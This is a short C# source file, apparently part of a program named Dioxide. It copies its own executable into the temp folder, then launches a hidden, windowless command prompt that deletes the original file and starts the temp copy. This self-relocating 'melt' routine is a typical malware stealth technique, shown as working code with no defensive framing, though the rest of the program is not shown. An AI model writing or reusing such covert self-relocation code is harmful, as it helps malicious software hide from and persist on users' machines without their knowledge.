using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace DIOXIDE
{
    public class FileIO
    {
        public string TempPath = Path.GetTempPath();
        public string exePath = Application.ExecutablePath;
        public void Create()
        {
            File.Create(TempPath + "Dioxide.");
            return;
        }
        public void Copy()
        {
            File.Copy(exePath, TempPath + "Dioxide.exe", true);
            return;
        }
        public void DeleteEXE()
        {
            ProcessStartInfo del = new ProcessStartInfo();
            del.FileName = "cmd.exe";
            del.Arguments = "/k del Dioxide.exe && Start %Temp%\\Dioxide.exe && Exit";
            del.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory;
            del.WindowStyle = ProcessWindowStyle.Hidden;
            del.CreateNoWindow = true;
            Process.Start(del);
        }
        public void DeleteTemp()
        {
            File.Delete(TempPath + "Dioxide.");
        }
    }
}
